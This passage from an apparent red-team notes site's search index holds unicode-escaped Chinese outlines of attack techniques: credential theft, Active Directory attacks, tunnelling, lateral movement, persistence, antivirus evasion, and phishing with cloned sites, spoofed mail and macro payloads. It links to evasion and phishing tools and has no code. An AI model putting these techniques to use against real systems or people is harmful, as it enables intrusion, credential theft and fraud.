\u6b64\u5904\u4e0d\u518d\u8d58\u8ff0 , \u662f\u9632\u5fa1\u91cd\u70b9] Windows SSP [\u6301\u4e45\u5316/\u5185\u5b58] Hook PasswordChangeNotify [\u6301\u4e45\u5316/\u5185\u5b58] OWA \u767b\u5f55\u8d26\u53f7\u5bc6\u7801\u622a\u83b7 \u622a\u83b7mstsc.exe\u4e2d\u8f93\u5165\u7684rdp\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 linux \u522b\u540d\u8bb0\u5f55\u5229\u7528 \u672c\u673a\u660e\u6587\u5bc6\u7801\u55c5\u63a2 [ http,ftp,pop3... ] \u4f20\u7edf\u952e\u76d8\u8bb0\u5f55 windows\u84dd\u5c4f\u6280\u5de7 [ \u6b64\u64cd\u4f5c\u4e3b\u8981\u4e3a\u5e94\u5bf9\u4e0d\u65f6\u4e4b\u9700,\u6bd4\u5982,\u641e\u84dd\u5c4f,\u767b\u7ba1\u7406\u5458\u767b\u5f55\u6293\u5bc6\u7801 ] Hash\u7206\u7834: Hashcat [ \u5b8c\u5168\u62fcGPU ]","title":"0x07 \u5185\u7f51\u5b89\u5168 [ \u5404\u7c7b\u654f\u611f\u51ed\u8bc1 \"\u641c\u96c6\" \u4e0e \"\u7a83\u53d6\" ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x08","text":"\u51fa\u7f51\u6d41\u91cf\u523a\u63a2 \u6bd4\u5982,http,dns,\u4ee5\u53ca\u4e00\u4e9b\u7a7f\u900f\u6027\u76f8\u5bf9\u8f83\u597d\u7684tcp\u7aef\u53e3... \u8fd9\u79cd\u64cd\u4f5c\u4e00\u822c\u90fd\u4f1a\u914d\u5408wmi,smb,ssh\u8fdc\u7a0b\u6267\u884c,\u5728\u5185\u7f51\u6279\u91cf\u5feb\u901f\u8bc6\u522b\u51fa\u80fd\u51fa\u7f51\u7684\u673a\u5668 \u5e38\u89c4 HTTP\u811a\u672c\u4ee3\u7406 abptts,Neo-reGeorg,reGeorg,tunna,reduh... \u4e0d\u5f97\u4e0d\u8bf4,\u516c\u5f00\u811a\u672c\u5728\u5b9e\u6218\u4e2d\u591a\u591a\u5c11\u5c11\u90fd\u4f1a\u6709\u4e9b\u95ee\u9898,\u8fd8\u9700\u8981\u6839\u636e\u81ea\u5df1\u7684\u5b9e\u9645\u76ee\u6807\u73af\u5883\u6df1\u5ea6\u6539\u8fdb\u624d\u884c SSH \u96a7\u9053 \u52a0\u5bc6\u7aef\u53e3\u8f6c\u53d1,socks \u5b9e\u6218\u7528\u9014\u975e\u5e38\u7075\u6d3b,\u6b64\u5904\u4e0d\u7ec6\u8bf4 ] Rdp \u96a7\u9053 \u53cd\u5411SOCKS nps, frp, ssf, CobaltStrike(socks4a & rportfwd ), sscoks ... \u5de5\u5177\u57fa\u672c\u90fd\u4e0d\u514d\u6740\u4e86,\u9700\u8981\u81ea\u884c\u5904\u7406 \u6b63\u53cd\u5411TCP \u7aef\u53e3\u8f6c\u53d1 \u975e\u5e38\u591a,\u5c31\u4e0d\u4e00\u4e00\u5217\u4e3e, eg: nginx,netsh,socat,ew.... DNS\u52a0\u5bc6\u96a7\u9053 Web\u7aef\u53e3\u590d\u7528 \u9700\u8981\u660e\u767d\u7684\u662f,\u5728\u4e00\u822c\u7684\u7ea2\u961f\u573a\u666f\u4e2d \u5165\u4fb5\u8005\u4e3a\u4e86\u5c3d\u53ef\u80fd\u8eb2\u907f\u5404\u79cd\u68c0\u6d4b\u8bbe\u5907\u7684\u6d41\u91cf\u89e3\u6790,\u5f88\u591a\u6b64\u7c7b\u5de5\u5177\u90fd\u4f1a\u91c7\u7528\u5404\u79cd\u5404\u6837\u7684\u65b9\u5f0f\u6765\u52a0\u5bc6\u4f20\u8f93\u6d41\u91cf,\u4ee5\u6b64\u6765\u4fdd\u8bc1\u81ea\u5df1\u6709\u66f4\u5f3a\u7684\u7a7f\u900f\u6027","title":"0x08 \u5185\u7f51\u5b89\u5168 [ \u5185\u7f51\u5e38\u7528 \"\u96a7\u9053\"\" / \"\u8f6c\u53d1\"\" / \"\u4ee3\u7406\"\" \u7a7f\u900f\u624b\u6cd5 \u63d0\u70bc\u6c47\u603b \uff0c\u9632\u5fa1\u91cd\u70b9 ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x09","text":"\u9488\u5bf9\u5f53\u524d\u57df\u7684\u4e00\u4e9b\u5e38\u89c4\u4fe1\u606f\u641c\u96c6[ \u5176\u5b9e\u73b0\u5b9e\u4e2d,\u53ea\u9700\u8981\u4e00\u4e2aBloodHound & Pingcastle\u8db3\u77e3,\u5c31\u662f\u5de5\u5177\u9700\u8981\u81ea\u884c\u4e8b\u5148\u514d\u6740\u597d] \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u5b8c\u6574\u57df\u7ba1\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709\u57df\u63a7\u673a\u5668\u540d\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709DNS\u670d\u52a1\u5668\u673a\u5668\u540d\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709SPN \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709OU \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709\u7528\u6237 & \u7528\u6237\u7ec4\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u4fe1\u4efb\u5173\u7cfb [ \u8de8\u57df\u6e17\u900f ] \u83b7\u53d6\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u7684\u5f00\u673a\u65f6\u95f4 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7f51\u6bb5\u53caweb\u7ad9\u70b9 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7b56\u7565 [ \u4e3b\u8981\u662f\u4e3a\u4e86\u4e86\u89e3\u5bc6\u7801\u7b56\u7565 ] \u83b7\u53d6\u5f53\u524d\u57df\u6797 ....... \u5feb\u901f\u83b7\u53d6\u76ee\u6807\u57df\u63a7\u6743\u9650\u7684\u4e00\u4e9b\u5e38\u89c4\u624b\u6cd5 \u641c\u96c6GPP \u76ee\u5f55 [ \u5176\u4e2d\u53ef\u80fd\u4fdd\u5b58\u7684\u6709\u57df\u8d26\u53f7\u5bc6\u7801,\u4e0d\u4ec5\u4ec5\u662f\u5b58\u5728XML\u91cc\u7684\u90a3\u4e9b,NETLOGON\u76ee\u5f55\u4e2d\u7684\u67d0\u4e9b\u811a\u672c\u540c\u6837\u4e5f\u53ef\u80fd\u4fdd\u5b58\u6709\u8d26\u53f7\u5bc6\u7801 ] \u670d\u52a1\u7968\u636ehash\u7834\u89e3(\"\u5c24\u5176\u662f\u57df\u7ba1\u7528\u6237\u7684\") [ kerberoast ] \u6279\u91cf\u5bf9\u57df\u7528\u6237\u8fdb\u884c\u5355\u5bc6\u7801\u5c1d\u8bd5 [ \u55b7\u5c04,\u5229\u7528ADSI\u63a5\u53e3,\u65e5\u5fd7id 4771 ] Kerberos \u59d4\u6d3e\u5229\u7528 \u7206\u7834LDAP Exchange\u7279\u5b9aACL\u6ee5\u7528 SSP \u622a\u83b7\u5173\u952e\u670d\u52a1\u5668\u767b\u5f55\u5bc6\u7801 \u5229\u7528\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u5728\u5185\u7f51\u5feb\u901f getshell [ \u5f31\u53e3\u4ee4, \u5404\u7c7bJAVA\u4e2d\u95f4\u4ef6\u5df2\u77e5Nday\u6f0f\u6d1e, \u5e38\u89c4Web\u6f0f\u6d1e... ],\u5728\u5185\u7f51\u5faa\u73af\u6293\u5404\u7c7b\u5bc6\u7801,\u76f4\u81f3 \u6293\u5230\u57df\u7ba1\u5bc6\u7801 \u6293\u5230\u57df\u7ba1\u4ee4\u724c DNSAdmin \u7ec4\u6210\u5458\u6ee5\u7528 [ \u52a0\u8f7d\u6267\u884c\u6076\u610fdll ] LAPS MS14-068 [ \u5982\u4eca\u5b9e\u9645\u4e2d\u5df2\u5f88\u5c11\u9047\u5230\u4e86 ] LLMNR/NBNS\u6b3a\u9a97 + SMB relay [ \u771f\u5b9e\u5728\u5b9e\u6218\u4e2d\u5176\u5b9e\u7528\u7684\u5e76\u4e0d\u591a ] \u57df\u5185\u540e\u6e17\u900f\u654f\u611f\u4fe1\u606f\u641c\u96c6\u5206\u6790 \u83b7\u53d6\u6240\u6709DNS\u8bb0\u5f55 \u5bfc\u51fa\u5f53\u524d\u57df\u7684\u5b8c\u6574LDAP\u6570\u636e\u5e93 \u63d0\u53d6\u5f53\u524d\u57df\u7684ntds.dit [ \u57df\u5185\u8d26\u53f7\u5bc6\u7801\u6570\u636e\u5e93 ] Dcsync\u540c\u6b65 Volume Shadow Copy Service \u57df\u5185\u6307\u5b9a\u7528\u6237\u767b\u5f55ip\u5b9a\u4f4d \u5229\u7528OWA\u767b\u5f55\u65e5\u5fd7 \u5229\u7528\u57df\u63a7\u670d\u52a1\u5668\u767b\u5f55\u65e5\u5fd7 \u6307\u5b9a\u670d\u52a1\u94f6\u7968 [ Silver Ticket ] \u9664\u6b64\u4e4b\u5916,\u5c31\u662f\u4e0b\u9762\u7684\u5404\u7c7b\u5e38\u89c4\u6a2a\u5411\u624b\u6cd5 \u57df\u5185\u6307\u5b9a\u7528\u6237\u673a\u5668\u5b9a\u5411\u63a7\u5236\u6280\u5de7 \u7ed1\u5b9a\u7528\u6237\u767b\u5f55\u811a\u672c \u5229\u7528GPO\u4e0b\u53d1 [\u5b9e\u9645\u4e0a,\u5229\u7528GPO\u80fd\u505a\u7684\u4e8b\u60c5\u8fd8\u975e\u5e38\u975e\u5e38\u591a] PTT [ \u7968\u636e\u4f20\u9012 ] \u9488\u5bf9\u57df\u7ba1\u7684\u5404\u79cd\u6743\u9650\u7ef4\u6301\u6280\u5de7 \u91d1\u7968 Skeleton Key DSRM\u5bc6\u7801\u540c\u6b65 OWA\u540e\u95e8 ... \u57df\u5185Exchange \u90ae\u4ef6\u6570\u636e\u8131\u53d6 \u5229\u7528Ews\u63a5\u53e3\u901a\u8fc7PTH\u7684\u65b9\u5f0f\u8131\u90ae\u4ef6","title":"0x09 \u57df\u5185\u7f51\u5b89\u5168 [ \u57df\u5185\u5e38\u7528\u653b\u51fb\u624b\u6cd5 ( \u57df\u6e17\u900f )\uff0c\u63d0\u70bc\u6c47\u603b\uff0c\u9632\u5fa1\u91cd\u70b9 ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x10","text":"\u4ece Windows\u5e73\u53f0 \u6a2a\u5411\u81f3 Windows\u5e73\u53f0 \u6ce8: \u4ee5\u4e0b\u67d0\u4e9b\u8fdc\u7a0b\u6267\u884c\u65b9\u5f0f, \u5373\u53ef\u76f4\u63a5\u7528\u660e\u6587\u8d26\u53f7\u5bc6\u7801 \u4ea6\u53ef \u57fa\u4e8epth\u6765\u8fdb\u884c, \u4e0d\u5c40\u9650 \u8fdc\u7a0b\u670d\u52a1\u7ba1\u7406 [ SCM ] \u8fdc\u7a0b\u521b\u5efa\u6267\u884c\u8ba1\u5212\u4efb\u52a1 [ Scheduled Tasks ] WMI \u8fdc\u7a0b\u6267\u884c [ WMI ] \u9488\u5bf9\u9ad8\u7248\u672cWindows \u7684WinRM \u8fdc\u7a0b\u6267\u884c DCOM \u8fdc\u7a0b\u6267\u884c [ \u9700\u8981\u76ee\u6807Windows\u673a\u5668\u4e8b\u5148\u5df2\u5173\u95ed\u9632\u706b\u5899 ] \u9ad8\u7248\u672c RDP \u8fdc\u7a0b\u6267\u884c \u5229\u7528MSSQL\u6570\u636e\u5e93\u5b58\u50a8\u8fc7\u7a0b\u6765\u53d8\u76f8\u8fdc\u7a0b\u6267\u884c \u5229\u7528Oracle\u6570\u636e\u5e93\u5b58\u50a8\u8fc7\u7a0b\u6765\u53d8\u76f8\u8fdc\u7a0b\u6267\u884c SMB [ PTH (hash\u4f20\u9012) ] RDP[MSTSC] \u53cd\u5411\u6e17\u900f [ \u5373\u53ef\u7528\u4e8e\u7a81\u7834\u67d0\u4e9b\u9694\u79bb, \u4ea6\u53ef\u901a\u8fc7\u4e91(Windows vps)\u76f4\u63a5\u53cd\u63a7\u76ee\u6807\u7ba1\u7406\u5458\u4e2a\u4eba\u673a CVE-2019-0887 ] \u5229\u7528\u8865\u4e01\u670d\u52a1\u5668\u4e0b\u53d1\u6267\u884c \u5229\u7528EDR\u4e3b\u63a7\u7aef\u5b9a\u5411\u4e0b\u53d1\u6267\u884c \u4ece Windows\u5e73\u53f0 \u6a2a\u5411\u81f3 *inux\u5e73\u53f0 plink \u6216\u8005 \u57fa\u4e8eWindows SSH\u5e93\u81ea\u884c\u5f00\u53d1\u5404\u79cd\u8fdc\u7a0b\u6267\u884c\u5c0f\u5de5\u5177 \u4ece *inux\u5e73\u53f0 \u6a2a\u5411\u81f3 Windows \u5e73\u53f0 \u4e00\u822c\u90fd\u4f1a\u5c06 impacket\u5957\u4ef6\u4e2d\u7684\u5404\u4e2a\u5e38\u7528py\u811a\u672c\u4e8b\u5148\u76f4\u63a5\u6253\u5305\u6210\u53ef\u6267\u884c\u6587\u4ef6, \u7136\u540e\u4e22\u5230\u76ee\u6807linux\u7cfb\u7edf\u4e2d\u53bb\u6267\u884c,\u5982\u4e0b wmiexec_linux_x86_64 smbexec_linux_x86_64 psexec_linux_x86_64 atexec_linux_x86_64 dcomexec_linux_x86_64 \u53e6\u5916,\u8fd8\u6709\u4e00\u4e9b\u57fa\u4e8ego\u7684\u5de5\u5177,\u540c\u6837\u4e5f\u53ef\u4ee5\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u6587\u4ef6\u4e4b\u540e\u518d\u4e22\u4e0a\u53bb\u6267\u884c \u4ece *inux\u5e73\u53f0 \u6a2a\u5411\u81f3 *inux \u5e73\u53f0 linux \u81ea\u5e26\u7684ssh\u5ba2\u6237\u7aef\u5de5\u5177\u5957\u4ef6, \u9ed8\u8ba4\u5c31\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c \u5404\u79cd\u8fdc\u7a0b\u4e0b\u8f7d\u6280\u5de7 wget [ win & linux ] curl [ win & linux ] \u4e4b\u6240\u4ee5\u6ca1\u7740\u91cd\u63d0\u4ee5\u4e0b\u8fd9\u4e9b\u7cfb\u7edf\u5185\u7f6e\u7684\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\u5de5\u5177,\u4e3b\u8981\u8fd8\u662f\u56e0\u4e3a\u4e8b\u5148\u5df2\u7ecf\u660e\u786e\u77e5\u9053 \u67d0\u4e9b\u6740\u8f6f\u73af\u5883\u4e0b\u5b83\u80af\u5b9a\u4f1a\u88ab\u62e6\u622a,\u6240\u4ee5\u4e8b\u5148\u5c31\u76f4\u63a5\u628a\u5b83\u5f03\u7528\u4e86,\u5c24\u5176\u9488\u5bf9\u7ea2\u961f\u8fd9\u79cd\u573a\u666f,\u8fd9\u4e9b\u4e1c\u897f\u6839\u672c\u4e0d\u5728\u4e4e\u591a,\u6709\u4e00\u4e2a\u80fd\u7528\u597d\u7528\u7684\u5373\u53ef CertUtil.exe Bitsadmin.exe Regsvr32.exe Rundll32.exe Powershell.exe ......","title":"0x10 \u5185\u7f51\u5b89\u5168 [ \u8de8\u5e73\u53f0\u6a2a\u5411\u6e17\u900f (\u8fdc\u7a0b\u6267\u884c)\uff0c\u9632\u5fa1\u91cd\u70b9 ( \"\u91cd\u4e2d\u4e4b\u91cd\" ) ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x11","text":"\u8fb9\u754c\u5165\u53e3\u6743\u9650\u7ef4\u6301 OWA \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801,webshell ] VPN \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801,shell ] \u5176\u4ed6 MAIL \u767b\u5f55\u53e3 [ \u8d26\u53f7\u5bc6\u7801 ] \u8fb9\u754c Web\u670d\u52a1\u5668 [ Webshell \u9a7b\u7559\u6280\u5de7 ] \u8fb9\u754c\u8def\u7531\u4ea4\u6362\u8bbe\u5907 [ \u8d26\u53f7\u5bc6\u7801,shell ] ... Windows \u5355\u673a\u7cfb\u7edf\u7ef4\u6301 [\u4e34\u65f6] \u7cfb\u7edf\u8ba1\u5212\u4efb\u52a1 [ \u9ad8\u6743\u9650/\u4f4e\u6743\u9650 ] \u5e38\u89c4\u6ce8\u518c\u8868\u81ea\u542f\u52a8\u9879 [ \u7528\u6237\u6743\u9650/system\u6743\u9650 ] Mssql\u5b58\u50a8\u8fc7\u7a0b [ \u7ee7\u627f\u670d\u52a1\u6743\u9650 ] WMI Winlogon CLR Logon Scripts MruPidlList Mof \u4f20\u7edf\u8fdc\u63a7 ... linux \u5355\u673a\u7cfb\u7edf\u7ef4\u6301 [\u4e34\u65f6] Patch SSH \u66ff\u6362\u5404\u7c7b\u57fa\u7840\u670d\u52a1so [ PAM,Nginx,Rsync ...] \u7cfb\u7edf\u8ba1\u5212\u4efb\u52a1 \u4f20\u7edf\u5e94\u7528\u5c42\u8fdc\u63a7 \u9a71\u52a8\u5c42\u8fdc\u63a7( \u9488\u5bf9\u7279\u5b9a\u5185\u6838\u7248\u672c )","title":"0x11 \u5185\u7f51\u5b89\u5168 [ \u6743\u9650\u7ef4\u6301\uff0c\u9632\u5fa1\u91cd\u70b9 ] [ \u6ce8: \u6709\u4e9b\u7ec6\u8282\u6b64\u5904\u5e76\u672a\u5c55\u5f00\u8be6\u7ec6\u8bf4\u660e ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x12","text":"web\u65e5\u5fd7 [ \u8bbf\u95ee, \u9519\u8bef\u65e5\u5fd7 ] \u6570\u636e\u5e93\u65e5\u5fd7 [ \u5f02\u5e38\u8fde\u63a5\u65e5\u5fd7,\u6162\u67e5\u8be2\u65e5\u5fd7 ] \u7cfb\u7edf\u5404\u7c7b\u5b89\u5168\u65e5\u5fd7 [ ssh,rdp,smb,wmi,powershell....] \u5404\u7c7b\u90ae\u7bb1\u767b\u5f55\u65e5\u5fd7 \u57df\u5185\u654f\u611f\u653b\u51fb\u5229\u7528\u65e5\u5fd7 [ \u91d1\u7968,\u94f6\u7968... ] \u6b64\u9879\u4e3a\u4e13\u4e1a\u84dd\u961f\u8303\u7574,\u4e0d\u518d\u8d58\u8ff0 ......","title":"0x12 \u75d5\u8ff9\u5904\u7406"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x13-c2","text":"CobaltStrike [\u4e8c\u6b21\u5f00\u53d1] payload(beacon) \u9006\u5411/\u6539\u8fdb\u91cd\u5199 Metasploit [\u4e8c\u6b21\u5f00\u53d1] ......","title":"0x13 \u5404\u7c7b\u5e38\u7528 C2 / \u6e17\u900f \u6846\u67b6"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x14-webshell","text":"\u83dc\u5200 caidao20160622 \u51b0\u87f9 Behinder_v2.0.1 \u8681\u5251 AntSword ......","title":"0x14 \u5404\u7c7b\u5e38\u7528 Webshell\u7ba1\u7406\u5de5\u5177"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x15","text":"\u9759\u6001 \u6df7\u6dc6: \u624b\u5de5\u6df7\u6dc6,\u6709\u6e90\u7801\u7684\u60c5\u51b5\u4e0b,\u5c1d\u8bd5\u9010\u4e2a\u66ff\u6362\u53ef\u80fd\u662f\u5173\u952e\u7279\u5f81\u5b57\u7b26\u4e32\u7684 \u547d\u540d\u7a7a\u95f4\u540d, \u51fd\u6570\u540d, \u53d8\u91cf\u540d, \u5b57\u7b26\u4e32 \u7b49\u7b49\u7b49.... \u5de5\u5177\u6df7\u6dc6,\u9488\u5bf9\u5404\u79cd\u8bed\u8a00\u7684\u4e13\u4e1a\u6df7\u6dc6\u5de5\u5177 [ \u6709\u5546\u4e1a\u7248 ] ... \u52a0\u58f3: \u4e00\u4e9b\u5e38\u7528\u516c\u5f00\u58f3\u7684\u5b9e\u9645\u6548\u679c\u53ef\u80fd\u5e76\u4e0d\u662f\u592a\u597d [ \u4e5f\u6709\u5546\u4e1a\u58f3 ] \u6700\u597d\u7684\u65b9\u5f0f\u8fd8\u662f\u5c1d\u8bd5\u81ea\u5df1\u5199\u58f3,\u5c31\u662f\u6210\u672c\u8f83\u9ad8 ... \u52a8\u6001 \u53cd\u5c04 shellcode \u5185\u5b58\u52a0\u89e3\u5bc6\u6267\u884c ( \u5bf9\u4e8e\u73b0\u5728\u7684\u67d0\u4e9b\u6740\u8f6f\u6765\u8bb2,\u53ef\u80fd\u5e76\u6ca1\u4ec0\u4e48\u5375\u7528,\u522b\u4eba\u62e6\u7684\u57fa\u672c\u90fd\u662f\u4f60\u7684\u6700\u7ec8\u8c03\u7528 ) \u767d\u5229\u7528 ...... \u6ce8: \u7406\u8bba\u4e0a, \u8fd9\u4e9b\u5e94\u8be5\u4e5f\u6ca1\u6709\u4ec0\u4e48\u975e\u5e38\u901a\u7528\u7684\u65b9\u6cd5 \u5927\u591a\u8fd8\u662f\u4e8b\u5148\u9488\u5bf9\u7279\u5b9a\u7684\u6740\u8f6f\u9488\u5bf9\u6027\u7684\u4e0d\u505c\u8c03\u8bd5\u5206\u6790\u51fa\u5b83\u5230\u5e95\u600e\u4e48\u62e6,\u600e\u4e48\u67e5\u7684,\u7136\u540e\u518d\u9488\u5bf9\u6027\u7684\u5bf9\u75c7\u4e0b\u836f \u6d41\u91cf: \u57df\u524d\u7f6e[\u5229\u7528\u5927\u5382cdn] DNS\u52a0\u5bc6\u96a7\u9053 \u7b2c\u4e09\u65b9\u516c\u5171\u90ae\u7bb1\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u7f51\u76d8\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u793e\u4ea4\u7f51\u7ad9\u4e0a\u7ebf \u7b2c\u4e09\u65b9\u533f\u540d\u793e\u4ea4\u5de5\u5177\u4e0a\u7ebf[eg: tg\u673a\u5668\u4eba,tor...] https://chaceshadow.github.io/","title":"0x15 \u514d\u6740 \u53ca \u5404\u7c7b\u9632\u706b\u5899\u5bf9\u6297"},{"location":"redteam/%E9%92%93%E9%B1%BC/","text":"\u9493\u9c7c\u653b\u51fb\u5206\u4e3a\uff1a 1\u3001\u9493\u9c7c\u90ae\u4ef6 2\u3001wifi\u9493\u9c7c 3\u3001\u9493\u9c7c\u4e8c\u7ef4\u7801 4\u3001\u4f2a\u57fa\u7ad9 5\u3001\u9c7c\u53c9\u5f0f\u9493\u9c7c\u653b\u51fb 6\u3001\u6c34\u5751\u9493\u9c7c\u653b\u51fb 7\u3001U\u76d8\u9493\u9c7c\u653b\u51fb \u653b\u51fb\u624b\u6cd5\u5206\u4e3a\uff1a 1\u3001\u901a\u8fc7\u6f0f\u6d1e\u89e6\u53d1 \u64cd\u4f5c\u7cfb\u7edf\u6f0f\u6d1e\uff08\u6728\u9a6c\u690d\u5165\uff09 \u5e94\u7528\u7a0b\u5e8f\u53ca\u6d4f\u89c8\u5668\u6f0f\u6d1e \u76ee\u6807web\u670d\u52a1\u5668\u6f0f\u6d1e ... 2\u3001\u5229\u7528\u793e\u5de5\u7684\u65b9\u5f0f\uff08\u975e\u6f0f\u6d1e\u89e6\u53d1\uff09 \u5185\u5bb9\u4eff\u5192\uff08\u7535\u5546/\u91d1\u878d\u7ad9\u70b9\u3001\u57df\u540d\uff09 \u865a\u5047\u8bf1\u9a97\uff08\u90ae\u4ef6\u3001\u77ed\u4fe1\u3001\u4e2d\u5956\u3001\u641c\u7d22\u5f15\u64ce\uff09 \u793e\u4f1a\u5de5\u7a0b\u5b66 0x01 \u90ae\u4ef6\u9493\u9c7c \u00b6 \u4e00\u3001\u7a83\u53d6\u53e3\u4ee4\u7c7b \u00b6 \u7528\u4f2a\u88c5\u7684\u7535\u90ae\uff0c\u6b3a\u9a97\u6536\u4ef6\u4eba\u5c06\u8d26\u53f7\u3001\u53e3\u4ee4\u7b49\u4fe1\u606f\u56de\u590d\u7ed9\u6307\u5b9a\u7684\u63a5\u6536\u8005 \uff1b\u6216\u5f15\u5bfc\u6536\u4ef6\u4eba\u8fde\u63a5\u5230\u7279\u5236\u7684\u7f51\u9875\uff0c\u8fd9\u4e9b\u7f51\u9875\u901a\u5e38\u4f1a\u4f2a\u88c5\u6210\u548c\u771f\u5b9e\u7f51\u7ad9\u4e00 \u6837\uff0c\u5982\u94f6\u884c\u6216\u7406\u8d22\u7684\u7f51\u9875\uff0c\u4ee4\u767b\u5f55\u8005\u4fe1\u4ee5\u4e3a\u771f\uff0c\u8f93\u5165\u4fe1\u7528\u5361\u6216\u94f6\u884c\u5361\u53f7\u7801 \u3001\u8d26\u6237\u540d\u79f0\u53ca\u5bc6\u7801\u7b49\u800c\u88ab\u76d7\u53d6\u3002 \u7b56\u7565\u8bf4\u660e\uff1a 1\u3001\u642d\u5efa\u9493\u9c7c\u7ad9\u9700\u8003\u8651\u65f6\u95f4\u6210\u672c\u548c\u961f\u4f0d\u7684\u4ee3\u7801\u529f\u5e95\u7b49\u5404\u79cd\u56e0\u7d20\uff0c\u4f7f\u7528Spoof Web\u548csetoolkit\u901f\u5ea6\u6700\u5feb\uff0chttrack\u4eff\u771f\u5ea6\u6700\u9ad8\uff0c\u4f46\u662f\u8981\u8bb0\u5f55\u8bbf\u95ee\u8005\u7684\u8f93\u5165 \u9700\u8981\u4fee\u6539\u76f8\u5173\u6587\u4ef6\uff0c\u6210\u672c\u8f83\u9ad8\u3002 2\u3001\u901a\u8fc7Swaks\u4f2a\u9020\u90ae\u4ef6\uff08\u6216\u5176\u4ed6\u65b9\u5f0f\uff09\u53d1\u9001\u793e\u5de5\u90ae\u4ef6\uff08\u6279\u91cf\u6216\u5b9a\u5411\uff09\u3002 3\u3001\u51e0\u4e2a\u91cd\u8981\u56e0\u7d20\uff1a\u4eff\u9020\u7684\u7ad9\u70b9\u76ee\u6807\u3001\u76ee\u6807\u4eba\u7fa4\u3001\u8bdd\u672f\u3002\u6f02\u4eae\u7684\u6218\u672f\u5236\u5b9a\u5f80 \u5f80\u6bd4\u6280\u672f\u70b9\u7684\u6289\u62e9\u66f4\u91cd\u8981\u3002\u4f8b\u598219\u5e74\u5e95\u5230\u73b0\u5728\u76db\u884c\u7684\u88f8\u804a\u8bc8\u9a97\u5957\u8def\uff0c\u901a\u8fc7 \u4eba\u6027\u7684\u5f31\u70b9\uff0c\u6548\u679c\u663e\u8457\u3002\u518d\u4f8b\u5982\u51e0\u4e2a\u6708\u524d\u7684\u67d0\u6b21\u6f14\u7ec3\uff0c\u67d0\u53f8\u961f\u4f0d\u901a\u8fc7\u53cd\u4ee3 \u9493\u9c7c\u7684\u624b\u6cd5\uff0c\u6210\u529f\u7684\u62ff\u5230\u4e86\u76ee\u6807\u7684\u7c7b\u4f3c\u4e91\u4e3b\u673a\u7ba1\u7406\u7cfb\u7edf\u7684web\u8d26\u53f7\u5bc6\u7801\uff0c\u63a5 \u7ba1\u4e00\u5806\u865a\u62df\u4e91\u4e3b\u673a\u3002 \u642d\u5efa\u9493\u9c7c\u7f51\u7ad9\u76f8\u5173\u53c2\u8003\uff1a 1\u3001\u4e00\u952e\u90e8\u7f72HTTPS\u9493\u9c7c\u7ad9 https://github.com/klionsec/SpoofWeb 2\u3001nginx\u505a\u53cd\u5411\u4ee3\u7406-\u9493\u9c7c https://www.cnblogs.com/R4v3n/articles/8460811.html 3\u3001\u514b\u9686\u7f51\u7ad9\u795e\u5668httrack https://github.com/xroche/httrack 4\u3001\u793e\u4f1a\u5de5\u7a0b\u5b66\u5de5\u7a0b\u5305 https://github.com/trustedsec/social-engineer-toolkit 5\u3001setoolkit\u7684\u5b89\u88c5\u4e0e\u4f7f\u7528 https://www.cnblogs.com/zhangb8042/articles/10910019.html 6\u3001flash\u7684\u9493\u9c7c\u9875 https://github.com/r00tSe7en/Fake-flash.cn \u90ae\u4ef6\u4f2a\u9020\u53c2\u8003\uff1a 1\u3001Swaks\u4f2a\u9020\u90ae\u4ef6 https://payloads.online/archivers/2019-05-09/1 2\u3001Swaks - Swiss Army Knife for SMTP http://www.jetmore.org/john/code/swaks/ 3\u3001CobaltStrike \u751f\u6210Office\u5b8f\u75c5\u6bd2\u8fdb\u884c\u9493\u9c7c\u653b\u51fb Office\u5b8f\u75c5\u6bd2\u6df7\u6dc6\u514d\u6740- EvilClippy CobaltStrike \u751f\u6210exe\u6728\u9a6c\u8fdb\u884c\u9493\u9c7c\u653b\u51fb\u514d\u6740\uff1a \u514d\u6740\u53ef\u4ee5\u7528 https://github.com/1y0n/AV_Evasion_Tool \u8fd8\u6ca1\u88ab\u548c\u8c10\u592a\u591a \u6df7\u6dc6\uff1a https://jishuin.proginn.com/p/763bfbd60aa3 CobaltStrike \u751f\u6210shellcode\u8fdb\u884c\u514d\u6740\u4e0a\u7ebf 4\u3001\u6c34\u5751\u653b\u51fb-Flash\u4f2a\u88c5 \u5047\u8bbe\u5df2\u7ecf\u62ff\u5230\u4e00\u53f0\u5185\u7f51web\u5728\u7528\u670d\u52a1\u5668\u7cfb\u7edf\u6743\u9650\uff0c\u4e0a\u4f20\u4f2a\u88c5\u514d\u6740\u9a6c\u5b50\u548c\u7279\u5b9ajs\uff0c\u5047\u8bbe\u627e\u5230\u7ad9\u70b9all.js\u6587\u4ef6\uff0c\u70b9\u51fb\u7f16\u8f91\u4fee\u6539 